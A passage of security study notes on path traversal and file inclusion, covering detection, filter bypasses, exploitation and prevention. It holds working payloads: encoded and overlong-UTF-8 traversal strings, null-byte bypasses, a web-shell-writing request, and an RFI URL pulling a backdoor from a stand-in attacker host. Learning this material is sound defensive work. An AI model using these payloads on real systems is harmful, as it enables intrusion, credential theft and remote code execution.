- ```$strict``` (optional): If ```true```, the function checks both value and type (e.g., ```"5"``` is not equal to ```5```). Default is ```false```.

Example Usage:

```
$allowedFiles = ['file1.txt', 'file2.txt'];

$file = 'file1.txt';

if (in_array($file, $allowedFiles)) {
    echo "File is allowed!";
} else {
    echo "Access denied!";
}
```

Output:

```
File is allowed!
```

This is useful for **whitelisting** values, such as filenames, user roles, or other controlled input, to prevent security issues like path traversal.

### Path Traversal Vulnerabilities:

Path traversal vulnerabilities occur when user-controlled input is used to access files or directories in an **unsafe manner**. If an application does not properly validate file paths, an attacker can manipulate input to read or overwrite files outside the intended directory. This can lead to leaking sensitive information (such as credentials and configuration files) or even remote code execution if critical files are modified.

Consider a web application that serves static images to users. The file is specified using a query string parameter like this:

```
http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg
```

When processing the request, the server follows these steps:

1. Extracts the ```filename``` parameter from the URL.

2. Appends the extracted value to a predefined directory path (```C:\filestore\```).

3. Opens the file at that location.

4. Reads the file's contents and sends them to the client.

Since the application directly appends user input to the file path without sanitization, an attacker can manipulate the path using special sequences like ```../``` (dot-dot-slash) to navigate the filesystem.

Malicious request:

```
http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows\win.ini
```

This results in the server interpreting the path as:

```
C:\filestore\..\windows\win.ini
```

Due to the ```..\``` traversal sequence, the effective path becomes:

```
C:\windows\win.ini
```

This means that instead of serving an image, the server accidentally exposes system files!

Why Is This Dangerous?

- Attackers can read configuration files like ```win.ini```, ```.bash_history```, or ```/etc/passwd```, potentially leaking sensitive credentials or system settings.

- If the application allows file writing, attackers can overwrite system files to gain command execution.

- In older systems (like Windows IIS with admin privileges), a successful attack could grant full system access.

**Bypassing Common Protections:**

Many applications attempt to prevent path traversal by implementing basic input validation, but these defenses can be flawed and bypassed in various ways:

1. Encoding Variations:

- ```%2e%2e%5c``` (```../``` in URL encoding)

- ```%252e%252e%255c``` (double-encoded)

2. Case Insensitivity on Windows:

- ```..\\``` (backslashes instead of slashes)

- ```..%5C``` (encoded backslash)

3. Trailing Null Byte (```%00```) Injection:

- Some applications may **terminate strings** at the null byte, allowing bypasses in weak sanitization routines.

4. Using Absolute Paths Instead of Relative Paths:

- ```/etc/passwd``` (Linux)

- ```C:\Windows\System32\drivers\etc\hosts``` (Windows)

Path traversal is one of the oldest and most well-known vulnerabilities, yet it still exists due to poor input validation. A skilled attacker can often bypass weak defenses using encoding tricks, null bytes, or variations in path notation. Proper whitelisting, absolute path enforcement, and proper access control are necessary to secure file-based functionalities.

### Finding and Exploiting Path Traversal Vulnerabilities:

Web applications often interact with the filesystem—whether to read, write, or modify files based on user input. If the application doesn’t handle these operations securely, an attacker can manipulate file paths to access restricted files or even overwrite system-critical data. This is known as a path traversal vulnerability (or directory traversal).

Many applications attempt to defend against path traversal, but weak or incomplete mitigations can be bypassed. This section covers:

- Identifying vulnerable areas

- Testing for path traversal

- Bypassing weak protections

- Handling custom encoding issues

When mapping a web application, **look for functionalities that interact with files.** These are prime targets for path traversal:

- File upload/download features (e.g., document-sharing platforms, blogs, auction sites).

- Dynamic templates & includes (e.g., ```include=main.inc```, ```template=/en/sidebar```).

- Document or image retrieval systems (e.g., serving reports, ebooks, or manuals).

As you test for other vulnerabilities, keep an eye out for suspicious error messages or unexpected outputs. These can hint at backend file operations.

**General Guidelines:**

1. Review Application Requests:

- Look for parameters referencing files or directories (e.g., ```page=report.pdf```, ```theme=dark.css```).

- Identify pages that likely retrieve files from disk rather than a database.

2. Look for Error Messages:

- If you see file-related errors (```File Not Found```, ```Permission Denied```, etc.), test for path traversal injection.

3. Inject Controlled Input:

Try inserting test strings (e.g., ```traversal_test123```) into **all request parameters**, including:

- Query strings (```?file=traversal_test123```)

- POST data (```file=traversal_test123```)

- Cookies (```session_id=traversal_test123```)

Focus on **one parameter at a time** for easier tracking.

4. Monitor Server Filesystem Activity:

If you have access to the server (during whitebox testing or post-exploitation), monitor file access using modern tools:

- Linux: ```strace -e trace=open,read,write -p <PID>``` (Tracks file operations of a process)

- Windows: Use **Sysinternals Process Monitor** (ProcMon) to log file access in real-time.

- macOS: ```fs_usage``` provides similar tracking.

**Example: Setting Up a File Monitor Filter**

On Windows (ProcMon):

- Add a filter for "Path contains traversal_test123", then generate requests to the application and check for matching events.

On Linux (strace example):

```
strace -e trace=open,read,write -p $(pgrep apache2)
```

This attaches to the Apache process and logs file access events, revealing whether your test input was used in a file operation.

Once you confirm a path traversal vulnerability, try different **bypass techniques:**

- Basic traversal attack: ```../etc/passwd```

- URL-encoded bypass: ```%2E%2E%2F%2E%2E%2Fetc/passwd```

- Double encoding: ```%252E%252E%252Fetc/passwd```

- Null byte termination (legacy systems): ```/etc/passwd%00.jpg```

Some apps implement weak filtering but fail to sanitize every possible bypass—so get creative. If the target allows writing files, you might escalate to remote code execution (RCE) by dropping a web shell or modifying a script.

### Detecting Path Traversal Vulnerabilities:

Once you've identified potential targets for path traversal, the next step is to test whether user-controlled data is improperly handled when interacting with the filesystem. This involves checking whether traversal sequences are accepted, blocked, or sanitized by the application.

For each user-supplied parameter that interacts with the filesystem, test whether directory traversal sequences (```../```) are correctly validated or if they allow unintended file access. A simple way to start is by introducing traversal sequences without stepping outside the intended directory.

**Step 1: Introducing a Single Traversal Sequence**

Assume the application constructs a file path based on user input like this:

```
file=foo/file1.txt
```

Now, modify the request to include an extra directory and a single traversal sequence:

```
file=foo/bar/../file1.txt
```

If the application behaves **identically** in both cases—returning the same file without errors—there is a good chance it is vulnerable. The reason is that most filesystems canonicalize paths before resolving them. This means that ```bar/../``` is resolved to nothing, effectively reducing the path back to ```foo/file1.txt```.

**Note:** If the app is vulnerable, it should return the file as expected. If it throws an error, it might be blocking traversal sequences or handling them incorrectly.

**Step 2: Attempting to Break Out of the Directory**

If the previous test suggests a possible vulnerability, the next step is to attempt escaping the base directory and accessing restricted files.

Try requesting a system file that is guaranteed to exist on most platforms:

- Linux/macOS:

```
file=../../../../etc/passwd
```

- Windows:

```
file=..\..\..\..\windows\win.ini
```

If the application's response changes—perhaps returning an error message or different output—it may indicate improper path handling. If it displays the file contents, then the application is confirmed vulnerable.

Many modern applications implement defenses against directory traversal attacks. However, these protections are often weak or improperly implemented, making them vulnerable to bypasses.

1. Double Encoding and URL Encoding:

Some applications filter traversal sequences (```../```) but fail to block encoded variations. Try these techniques:

- URL-encoded traversal:

```
file=%2e%2e%2fetc/passwd
```

(```%2e%2e%2f``` = ```../```)

- Double-encoded traversal:

```
file=%252e%252e%252fetc/passwd
```

(```%252e%252e%252f``` = ```%2e%2e%2f``` = ```../```)

2. Using Alternative Path Notations:

Some web applications handle path traversal inconsistently due to different OS behaviors. Consider:

- Windows allows both ```\``` and ```/``` as directory separators.

```
file=..\..\..\..\windows\win.ini
file=../../../../windows/win.ini
```

- Unicode encoding tricks:

```
file=%c0%ae%c0%ae%c0%afetc/passwd
```

(May be interpreted as ```../``` in certain encodings)

- Null byte injection (legacy PHP versions):

```
file=../../../../etc/passwd%00
```

(```%00``` terminates strings early in C-based applications)

3. Redundant Traversal Sequences:

Most filesystems **ignore redundant traversal sequences** that go above the root directory. Submitting an excessive number of sequences helps avoid false negatives. Example:

```
file=../../../../../../../../../etc/passwd
```

Even if the starting directory is deep in the filesystem, this method ensures traversal attempts reach the root.

**Testing for Write Access Exploits:**

If an application allows writing to files, a successful traversal exploit could lead to remote code execution (RCE) by overwriting scripts or configuration files.

**Step 1:** Checking for Writable Files:

Try writing to:

- General test file:

```
/tmp/writetest.txt
```

- System files (should fail if permissions are enforced):

```
/windows/system32/config/sam
/etc/shadow
```

If the first test succeeds but the second fails, the application is likely vulnerable.

**Step 2:** Uploading a Malicious File:

Try writing a web shell to the web root directory:

- Linux:

```
/var/www/html/shell.php
```

- Windows (IIS):

```
C:\inetpub\wwwroot\shell.aspx
```

If successful, visiting ```/shell.php``` in a browser may give remote command execution.

**Additional Notes:**

Path traversal itself doesn't allow writing—it only lets you access files if the application uses user input to construct file paths insecurely. For write access exploits, you'd need another vulnerability—like an unrestricted file upload, insecure file creation, or arbitrary file write—alongside path traversal.

Clarifications and Examples:

1. Path Traversal Alone → Only Read Access:

- You can fetch ```../../../../etc/passwd```, but you can’t modify or create files.

2. Path Traversal + File Write Vulnerability → Exploitable for RCE:

- If an app allows writing files (```touch```, ```fwrite()```, ```open("w")``` in Python, etc.), but it **doesn’t sanitize paths**, then you can **write outside the intended directory.**

- Example: If a file upload function writes user avatars to ```/uploads/```, but you manipulate it to write outside ```/uploads/``` into ```/var/www/html/shell.php```, you get RCE.

**How Would You Actually Test for Writable Files?**

You’d need:

- A misconfigured file upload endpoint (e.g., image upload)

- A web feature that logs user input into a file without sanitization

- A vulnerable script that writes user-controlled input to disk

Let’s say you find a form that saves error logs to a file, like this:

```
$log_file = "logs/" . $_GET['logfile'];
file_put_contents($log_file, $_GET['content']);
```

If the ```logfile``` parameter isn’t sanitized, you could do this:

```
GET /vuln.php?logfile=../../../../var/www/html/shell.php&content=<?php system($_GET['cmd']); ?>
```

Now, navigating to ```/shell.php?cmd=whoami``` would execute a system command.

Note: The ```vuln.php?logfile=...``` part is just an example of a vulnerable endpoint that might exist in a real-world scenario.

**In short:**

- Check if a web app lets you upload files but doesn’t restrict their destination.

- Try path traversal tricks with a file-writing function (not just reading).

- Use LFI to check logs—sometimes apps log user input, and you can inject PHP code.

### Circumventing Obstacles to Traversal Attacks:

If your initial attempts to perform a path traversal attack are unsuccessful, don’t assume that the application is completely secure. Many developers try to defend against traversal attacks by implementing input validation mechanisms, but these defenses are often flawed and can be bypassed with various techniques.

The most common defense is filtering or sanitizing user input to detect path traversal sequences (../, ..\). If the application spots these patterns, it may reject the request or attempt to strip out the offending sequences. However, due to issues with canonicalization (how paths are processed and resolved internally), attackers can often trick these filters by encoding traversal sequences in alternative ways.

**Common Techniques for Bypassing Input Filters:**

1. Use Both Forward Slashes and Backslashes:

- Some filters only check for ```/``` (forward slash) but not ```\``` (backslash), even though many filesystems support both. Try submitting:

```
..\windows\win.ini
../../etc/passwd
```

- This is particularly useful against Windows-based applications that interact with a back-end system supporting both formats.

2. Basic URL Encoding:

- Some applications filter ```../``` sequences explicitly but fail to detect them when encoded. Encode each part of the traversal sequence:

```
.   → %2e  
/   → %2f  
\   → %5c  
```

Example:

```
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

3. 16-bit Unicode Encoding:

- Some applications normalize input differently when using Unicode, which can bypass certain filters. Encode the characters using Unicode:

```
.   → %u002e  
/   → %u2215  
\   → %u2216  
```

Example:

```
%u002e%u002e%u2215etc%u2215passwd
```

4. Double URL Encoding:

- Some applications decode input twice, meaning an already URL-encoded sequence might be reprocessed incorrectly. Double-encode the traversal sequences:

```
.   → %252e  
/   → %252f  
\   → %255c  
```

Example:

```
%252e%252e%252fetc%252fpasswd
```

- If the application decodes this once, it becomes ```%2e%2e%2fetc%2fpasswd```, which may then resolve to ```../etc/passwd```.

5. Overlong UTF-8 Unicode Encoding (Bypassing Filters with Over-encoding):

- Overlong UTF-8 encoding exploits the fact that multiple byte sequences can represent the same character. Overlong UTF-8 encoding is a sneaky method that takes advantage of poor Unicode implementations. Some systems fail to normalize these properly, allowing attackers to sneak past filters. Instead of representing ```.``` and ```/``` normally, use their overlong UTF-8 encodings:

```
.   → %c0%ae or %e0%80%ae  
/   → %c0%af or %e0%80%af  
\   → %c0%5c or %e0%80%5c  
```

Example:

```
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

- If the server improperly handles overlong encoding, it might interpret these as ```../etc/passwd```, bypassing filters that check for standard ```../``` sequences.

**Why This Works:**

- Many input validation mechanisms only check for the standard ASCII representations (```../```), but overlong UTF-8 encoding allows attackers to introduce equivalent sequences that aren't detected. Some older Unicode parsers, especially on Windows, incorrectly decode overlong sequences and treat them as normal characters.

- Overlong UTF-8 encoding is a way of **representing a single character using more bytes than necessary in UTF-8.** Instead of using the shortest valid encoding, it pads the character with extra bytes. This can confuse parsers that don't properly validate UTF-8 sequences.

Let's take ```../etc/passwd``` as an example. Normally, in UTF-8:

- ```.``` (dot) is ```0x2E```

- ```/``` (slash) is ```0x2F```

But with overlong encoding:

- ```.``` can be represented as ```%c0%ae``` (instead of ```%2e```)

- ```/``` can be represented as ```%c0%af``` (instead of ```%2f```)

**How Overlong UTF-8 Encoding Works?**

Normally, the dot (```.```) is ASCII ```0x2E```, which is **1 byte** long.  But in UTF-8, we can force it to use **more bytes** than needed by encoding it as a **two-byte sequence** instead.

Here's Step-by-Step Breakdown (for ```.``` → ```%c0%ae```)

- The ASCII dot (```.```) is ```0x2E``` (hex) = ```00101110``` (binary).

- In UTF-8, a **two-byte sequence** starts with a leading byte in the ```110xxxxx``` format.

- The second byte must follow the ```10xxxxxx``` format.

So, we encode ```0x2E``` (```00101110``` in binary) into two bytes:

- First byte (```11000000``` or ```0xC0```) → This is a padding byte that makes it a two-byte UTF-8 sequence.

- Second byte (```10101110``` or ```0xAE```) → This holds the original ```0x2E``` value.

Now, when URL encoding this, ```0xC0``` becomes ```%c0``` and ```0xAE``` becomes ```%ae```, giving us:

```
%c0%ae
```

**What About ```/``` (```0x2F```)?**

Using the same process:

- ```/``` is ```0x2F``` (ASCII).

- Overlong UTF-8 encoding makes it ```%c0%af``` (where ```0xC0``` is padding, and ```0xAF``` is the encoded ```/```).

So, applying this to a traversal sequence:

```
../etc/passwd  
```

becomes

```
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

- Some applications validate input before decoding UTF-8. They might block ```../``` but fail to detect %c0%ae%c0%ae%c0%af as an equivalent. Windows and older Unicode parsers sometimes incorrectly normalize overlong sequences, treating them as valid input instead of rejecting them. Modern systems correctly reject overlong UTF-8 sequences, but legacy applications, misconfigured filters, or poorly implemented decoding functions may still be vulnerable.

- It’s like Base64 padding, but instead of ensuring alignment, it’s **tricking the system into thinking a simple character is part of a multi-byte sequence.** Filters that check for ```0x2E``` (dot) might not recognize ```%c0%ae``` as the same character, letting it slip through.

6. Bypassing Incomplete Sanitization (Non-Recursive Filters):

- Some applications strip or replace ```../``` sequences but do not apply the filter recursively. If that’s the case, nesting traversal sequences can trick the filter.

Example:

```
....//    (Expands to ../)
....\\    (Expands to ..\)
....\/    (Expands to ../)
....\./   (Expands to ../)
```

- If the filter removes only the first ```../```, the attack still succeeds.

**In short:**

- Many path traversal defenses rely on weak filtering techniques rather than proper security controls.

- Encoding tricks work because applications often decode input incorrectly or fail to normalize paths before filtering.

- Overlong UTF-8 abuses multi-byte encoding to represent a simple character (```.``` or ```/```) using extra bytes. This tricks filters that only check the shortest valid encoding.

- Always experiment with different encoding schemes when testing for traversal vulnerabilities!

### Circumventing Filename-Based Path Traversal Defenses:

While some applications attempt to block path traversal using sequence filtering, others take a different approach: enforcing strict filename rules. These defenses often verify whether a user-supplied filename starts with a specific directory, ends with a specific file type, or contains an expected structure. However, these protections can still be bypassed using encoding tricks, injection techniques, and null-byte exploits.

1. Bypassing File Type Restrictions with Null Bytes:

Some applications restrict access to only certain file types, rejecting any filenames that do not end with an expected extension. To bypass this, attackers can append a null byte (```%00```) to their requested filename, followed by an allowed extension.

Example: a web application only allows access to ```.jpg``` files. An attacker tries to read ```boot.ini```, but the server rejects it. Instead, they request:

```
/boot.ini%00.jpg
```

- Many programming languages (like Java) allow strings to contain null bytes, so the filter sees the full filename: ```boot.ini%00.jpg```. However, when the file is actually accessed, the underlying system may treat ```%00``` as a null terminator, effectively truncating the filename to ```boot.ini``` before passing it to the filesystem. This happens in C-based languages like PHP, where string handling stops at the first null byte.

**Can this be used in file uploads?**

Yes! If an upload validation system checks only the extension (e.g., ```.jpg```), but the storage mechanism truncates at the null byte, an attacker could upload a disguised ```.php``` backdoor:

```
shell.php%00.jpg
```

This would bypass the upload filter but still execute as PHP if processed by the server.

2. Bypassing Forced File Extensions:

Some applications **append a specific file extension** to user-supplied filenames to enforce file type restrictions. For example, a server might force all requests to end with ```.log```, appending it automatically if not present.

Example: an application allows users to retrieve logs via:

```
/logs?file=access.log
```

But when an attacker requests:

```
/logs?file=../../etc/passwd
```

The system automatically appends ```.log```, making the final request:

```
../../etc/passwd.log
```

This would prevent traversal. However, if null-byte injection works, an attacker can try:

```
/logs?file=../../etc/passwd%00
```

If successful, the file extension ```.log``` is ignored at the OS level, and the attacker retrieves ```/etc/passwd```.

3. Bypassing Directory Prefix Restrictions:

Some applications attempt to **restrict access by enforcing a specific starting directory** for user-supplied filenames. A common check ensures that any filename must begin with an expected prefix, such as ```filestore/```.

Example: an application only allows access to files inside ```filestore/```. The following request is permitted:

```
/files?file=filestore/document.txt
```

However, if an attacker tries to access ```/etc/passwd```, the application blocks:

```
/files?file=/etc/passwd
```

**Bypass Trick:**

Some poorly implemented filters only check **whether the filename starts with the expected prefix** but don’t enforce strict path validation. This can sometimes be bypassed using **double slashes or mixed path separators:**

```
/files?file=filestore//../../etc/passwd
/files?file=filestore\..\..\etc\passwd
```

If the filter simply checks for ```"filestore/"``` at the beginning of the string but does not properly resolve the path, the traversal still works.

4. Combining Attacks for Stronger Bypasses:

If a system implements multiple filtering mechanisms, a single trick may not be enough. Attackers often need to chain traversal bypass techniques together to gradually escalate access.

**Example Attack Flow:**

Test traversal sequences:

- If ```/etc/passwd``` is blocked, try traversal bypasses:

```
too/../diagram1.jpg
```

If traversal works but file type filtering is applied:

- Try adding a null byte:

```
diagram1.jpg%00.jpg
```

If file type bypass works but directory restrictions remain:

- Try inserting required prefixes with traversal tricks:

```
filestore//../../etc/passwd
```

By systematically testing **each filter separately**, attackers can isolate weaknesses and combine multiple techniques for a complete bypass.

5. The Whitebox Advantage:

If an attacker has source code access (whitebox testing), they can easily inspect input validation logic and bypass filters without brute-force testing. By analyzing how filenames are handled in code, they can determine:

- Whether the application uses null-terminated strings

- Which file extensions are enforced

- Whether input validation is performed before or after appending extensions

This section showed how **null-byte injection, forced file extensions, and directory prefix filtering** can be bypassed through **encoding tricks, traversal techniques, and chaining multiple attacks together.**

### Coping with Custom Encoding:

One of the most unusual path traversal vulnerabilities ever encountered by the authors of this book I'm studying involved a custom encoding scheme that ultimately failed to secure filenames. This case illustrates a crucial lesson: **obfuscation is never a substitute for real security.**

The vulnerable web application provided workflow functionality that allowed users to upload and later download files. The upload request included a filename parameter that was vulnerable to path traversal when saving the file. However, there were two security mechanisms in place:

1. Duplicate File Prevention – The application checked whether a file with the same name already existed. If so, it refused to overwrite it.

2. Obfuscated Download URLs – When a user uploaded a file, the application generated a download URL using a proprietary encoding scheme. This scheme appeared to be a customized form of Base64 encoding, but with a different character set used at each position.

These restrictions made exploitation more difficult. Although attackers could write files to the server, they couldn’t overwrite existing files, and they also couldn’t directly request sensitive files like ```/etc/passwd``` without first figuring out how the encoding worked.

At first glance, this encoding seemed like a major roadblock—reverse-engineering it would be time-consuming and tedious. But through experimentation, the researchers found a way to exploit the system without ever fully decoding the obfuscation algorithm.

By uploading test files and observing their encoded download URLs, they made an interesting discovery:

- ```test.txt``` (Uploaded Filename) became ```zmiytu4nty2y``` (Obfuscated URL)

- ```foo/../test.txt``` (Uploaded Filename) became ```ElNzUyMzEOzjQONjMzND``` (Obfuscated URL)

Observations:

- The encoded URLs varied in length depending on the input filename.

- These encoded URLs seem to be some kind of modified Base64 encoding. The key finding here is that **the encoding was applied after the filename was received**—before any security checks were performed. This means that **manipulating the filename before upload would influence the encoded output**, giving attackers control over the final download URL.

- In other words, this strongly suggested that **no path normalization was applied before encoding**—meaning that redundant sequences like ```../``` were preserved. This oversight was the key to breaking the system.

Armed with this insight, the attackers crafted an exploit. They uploaded a file with a traversal payload embedded in the filename:

```
/etc/passwd/../../tmp/foo
```

When resolved (canonicalized), this simply points to:

```
/tmp/foo
```

Because the web server had permission to write to ```/tmp/```, the upload succeeded. This produced an obfuscated download URL:

```
FhwUklrNXFUVEJOZWlkNlRsUk5NazE2VlRKTmFrMHdUbXBWZWslNldYa
```

Instead of fully decoding this, the attackers made a crucial realization:

- The obfuscated URL **contained the original filename as-is**, just encoded.

- By truncating the encoded string at the right point, they could trick the system into requesting a different file.

To retrieve ```/etc/passwd```, they **shortened the encoded URL** at a strategic position:

```
FhwUklrNXFUVEJOZWlkNlRsUk5NazE2VlRKTmFrM
```

The truncated version **stopped encoding the filename just before it reached the ```/tmp/foo``` part**, effectively changing the target file. When the system decoded the manipulated URL, it retrieved ```/etc/passwd``` instead.

**How did they know where to truncate?**

This is where understanding Base64 encoding mechanics comes in. Base64 encodes data in **blocks of 3 bytes (24 bits)**, which are then converted into **4 encoded characters.** The trick here was to ensure that the truncated string ended on a complete encoding boundary.

If they had truncated it mid-block, the decoding function would likely have thrown an error due to incorrect padding or malformed data. By appending redundant ```./``` sequences in their filename, they controlled the encoded output to align properly with Base64 boundaries. This allowed them to remove just enough characters to expose ```/etc/passwd```.

While ```./``` isn't a traversal sequence like ```../```, but it serves a different purpose: **it acts as a no-op that still alters the encoded string.** ```./``` simply means "the current directory" in Linux and has no real effect when resolving paths. Since the encoding was applied before any path normalization, adding ```./``` changed the encoded output but did not affect the actual path resolution.

Overall, **path canonicalization matters** – If the application had resolved the filename to its absolute path before encoding, this attack would not have been possible. The developers likely thought the obfuscated URLs would prevent unauthorized access, but they overlooked a trivial way to manipulate them.

### Exploiting Path Traversal Vulnerabilities:

Once you've identified a path traversal vulnerability that grants read or write access to the server's filesystem, you can exploit it in various ways. Your level of access will typically be the same as the web server process, meaning any files that the server can read or write are within reach.

**Exploiting Read Access:**

If the vulnerability allows reading arbitrary files, you can retrieve sensitive information that may either be directly useful or help refine other attacks. Some valuable targets include:

- System and application password files:

Example: On Linux, ```/etc/passwd``` (or ```/etc/shadow``` if readable) may reveal system user accounts.

Example: Windows ```C:\Windows\System32\config\SAM``` (if accessible) contains hashed passwords.

- Configuration files:

Web server config files (e.g., Apache’s ```httpd.conf```, Nginx’s ```nginx.conf```) can reveal settings, directories, or custom security rules.

Application configs (e.g., ```web.config```, ```wp-config.php```) often contain database credentials.

- Include files with database credentials:

PHP and other server-side scripting languages often store credentials in ```.inc``` or ```.php``` files.

Example: ```config.php``` might contain ```DB_USER``` and ```DB_PASS```.

- Application data sources:

XML, JSON, or MySQL database files may hold user data, API keys, or other secrets.

- Source code of executable pages:

If you can retrieve a file like ```GetImage.aspx```, it may reveal how input is processed, allowing you to find additional vulnerabilities (e.g., SQL injection).

- Application log files:

Log files often contain usernames, session tokens, or debug information, which can be leveraged for session hijacking or privilege escalation.

**Exploiting Write Access:**

If you have the ability to write files, the primary goal should be to achieve remote code execution (RCE). Here are common techniques:

- Drop malicious scripts into web-accessible directories:

Upload a web shell (```PHP```, ```ASP```, or ```JSP``` backdoor) to execute commands.

Example: Writing ```evil.php``` to ```/var/www/html/uploads/``` and accessing it via ```http://target.com/uploads/evil.php```.

- Modify startup scripts:

On Linux, writing a script into ```/etc/init.d/``` or ```/home/user/.bashrc``` can trigger execution on reboot or user login. On Windows, writing a script to ```C:\Users\All Users\Start Menu\Programs\Startup\``` ensures execution at login.

- Tamper with service binaries or configuration:

Replacing or injecting commands into scripts that execute when a service starts (like ```cron``` jobs or systemd services).

- Modify files used by FTP servers (like ```in.ftpd```):

It’s an old-school FTP server daemon found on Unix systems. Attackers could modify its startup script to execute arbitrary commands when an FTP user connects. More commonly today, similar attacks could target ```vsftpd.conf``` or ```proftpd.conf``` instead.

Overall, these attacks **never rely on brute force**—just creative thinking and good enumeration.

### Preventing Path Traversal Vulnerabilities:

The most effective way to eliminate path traversal vulnerabilities is to avoid passing user-supplied input directly to filesystem APIs. Often, this is entirely unnecessary. For example, in the case of a URL like:

```
GetFile.ashx?filename=keira.jpg
```

Instead of dynamically fetching files based on user input, the application could simply store files within a designated web directory and allow direct access via a URL. If this isn’t an option, a safer approach would be to use a predefined list of files that the application is allowed to serve. Instead of passing the filename, the application can use an identifier (e.g., an index number or a unique ID). Any request containing an invalid identifier should be rejected, removing the attack surface for directory traversal attempts.

However, some applications, particularly those handling file uploads or personalized storage, may need to allow user-specified filenames. In such cases, a defense-in-depth approach is critical. Here are several key protections that should be implemented together rather than relying on just one:

1. Input Validation & Filtering:

- Decode and normalize user input before processing. Attackers may attempt to obfuscate traversal sequences using URL encoding (```%2e%2e%2f```), double encoding, or Unicode tricks.

- Reject filenames containing dangerous sequences, such as: ```../``` (Unix/Linux), ```..\``` (Windows) and Null bytes (```%00```), which can terminate strings early in some languages.

- Do not attempt to "sanitize" malicious filenames by stripping out certain characters. Attackers may find ways around poorly implemented sanitization. Instead, outright reject such inputs.

2. Allow Only Predefined File Types:

- Maintain a hardcoded whitelist of allowed file types (e.g., ```.jpg```, ```.png```, ```.pdf```) and reject anything else.

- Perform file type validation after decoding and normalization to prevent bypasses.

3. Enforce Directory Constraints:

- Ensure that user-supplied filenames never escape the intended directory. This can be done using system-specific API checks:

- Java:

```
File file = new File(userInput);
String canonicalPath = file.getCanonicalPath();
if (!canonicalPath.startsWith("/var/www/images/")) {
    throw new SecurityException("Access Denied!");
}
```

**Additional Notes:**

- ```getCanonicalPath()``` resolves the absolute, normalized path of the file, eliminating things like ```../``` and symbolic links.

- The ```startsWith("/var/www/images/")``` check ensures that the file is inside the allowed directory.

- The key part: If ```canonicalPath``` does not start with ```/var/www/images/```, that means the user tried to access something outside of the intended directory. In that case, we block it by throwing an exception.

**Example of an Attack Attempt:**

Legitimate request:

```
userInput = "profile.jpg"
```

- ```canonicalPath``` → ```/var/www/images/profile.jpg```

- Condition: ```/var/www/images/profile.jpg```.startsWith(```/var/www/images/```) → true

- No exception thrown → File access allowed.

Malicious traversal attempt:

```
userInput = "../../etc/passwd"
```

- ```canonicalPath``` → ```/etc/passwd``` (red flag)

- Condition: ```/etc/passwd```.startsWith(```/var/www/images/```) → false

- Exception is thrown → Blocked!

So,  the "bad" case is when the path does not start with the safe directory. That’s when we throw an exception to prevent access to unintended files.

- ASP.NET (C#):

```
string fullPath = Path.GetFullPath(userInput);
if (!fullPath.StartsWith(@"C:\SafeDirectory\")) {
    throw new UnauthorizedAccessException("Invalid file access.");
}
```

- On UNIX-based systems, consider **chroot environments**, which create an isolated filesystem jail, preventing traversal beyond a designated directory.

- On Windows, a similar effect can be achieved by mounting the target directory as a separate logical drive (e.g., ```X:\files\```).

4. Logging & Intrusion Detection:

- While strict validation and filtering should prevent attacks, all attempted path traversal exploits should still be logged for security monitoring.

- The application can flag repeated attacks for review, but automatically suspending user accounts might be an overreaction (not to mention annoying). A better approach would be to alert an administrator or apply progressive security measures (like CAPTCHA or rate-limiting) before taking action.

### File Inclusion Vulnerabilities:

Many scripting languages support *include files*, which allow developers to separate reusable code components into different files. These files can then be inserted into function-specific scripts as needed. The included file’s content is interpreted just as if it were written directly inside the main script.

File inclusion vulnerabilities arise when an application improperly handles user input to determine which files should be included. This can lead to unauthorized file execution, remote code execution, or sensitive data exposure.

#### Remote File Inclusion (RFI):

PHP is particularly vulnerable to file inclusion attacks because its ```include``` and ```require``` functions can accept remote file paths if not properly restricted. This has historically led to numerous security flaws in PHP applications.

Consider an application that loads different content based on a user's selected country:

```
$country = $_GET['Country'];  
include($country . '.php');
```

Breakdown:

- ```$_GET['Country']``` → Retrieves the user-provided Country parameter from the URL query string.

- ```$country . '.php'``` → Concatenates the user input with ```.php```, meaning if ```Country=US```, the result would be ```US.php```.

- ```include($country . '.php');``` → Dynamically includes the file, treating it as part of the executing script.

If the application doesn't restrict external file loading, an attacker could craft a URL like this:

```
https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor.php
```

Since ```include()``` will attempt to fetch and execute the specified file, the attacker's ```backdoor.php``` is executed on the vulnerable server, potentially granting remote access or executing arbitrary commands.

**How to Prevent RFI:**

- Disable ```allow_url_include``` in ```php.ini``` to prevent remote file execution.

- Use a whitelist of allowed files instead of dynamically including based on user input.

- Sanitize and validate input, ensuring it matches only expected filenames.

#### Local File Inclusion (LFI):

Even if remote URLs are restricted, an attacker might still be able to include local files. This is called Local File Inclusion (LFI) and can be used to execute arbitrary scripts or read sensitive files on the server.

An attacker could attempt to exploit the same vulnerable script by injecting directory traversal sequences:

```
https://wahh-app.com/main.php?Country=../../../../../etc/passwd
```

If the application fails to validate input, ```include()``` would process ```/etc/passwd```, exposing system user data.

#### LFI in Other Technologies:

While PHP is notorious for file inclusion vulnerabilities, similar flaws exist in other languages.

Example: ASP ```Server.Execute()```

The book originally mentioned ASP's ```Server.Execute()``` as vulnerable to local file inclusion. This function allows an ASP script to execute another ASP file on the same server. The idea is that an attacker could use this to execute unauthorized scripts, assuming they are already present on the server.

Example of Exploitable Code in ASP:

```
dim page
page = Request.QueryString("page")
Server.Execute(page & ".asp")
```

An attacker could craft a request like:

```
https://wahh-app.com/main.asp?page=admin_panel
```

If ```admin_panel.asp``` is a restricted script, but not properly protected from inclusion, the attacker could bypass authentication mechanisms.

Potential Exploits with LFI:

- **Access restricted server-executable files** – Scripts that normally require authentication might be included and executed elsewhere.

- **Expose static resources** – Protected files (such as configuration files) could be included dynamically, revealing sensitive information.

Mitigation Strategies for File Inclusion Attacks:

- Use an Allowlist – Define a list of valid file names and prevent arbitrary inclusion.

- Sanitize Input – Strip out special characters (```../```, ```\```, ```%00```) and validate file paths.

- Use Absolute Paths – Avoid dynamically constructing file paths from user input.

- Apply Least Privilege – Restrict file execution permissions to minimize the impact of a successful attack.

- Monitor and Log Requests – Detect and alert on suspicious path traversal attempts.

### Finding File Inclusion Vulnerabilities:

File inclusion vulnerabilities can arise whenever user input is used to specify a file to be included or executed by the application. These vulnerabilities are particularly common in request parameters that determine language, location, or theme settings. They are also frequently found in parameters that explicitly reference server-side files.

To identify **remote file inclusion** vulnerabilities, follow these steps:

1. Inject a Remote URL:

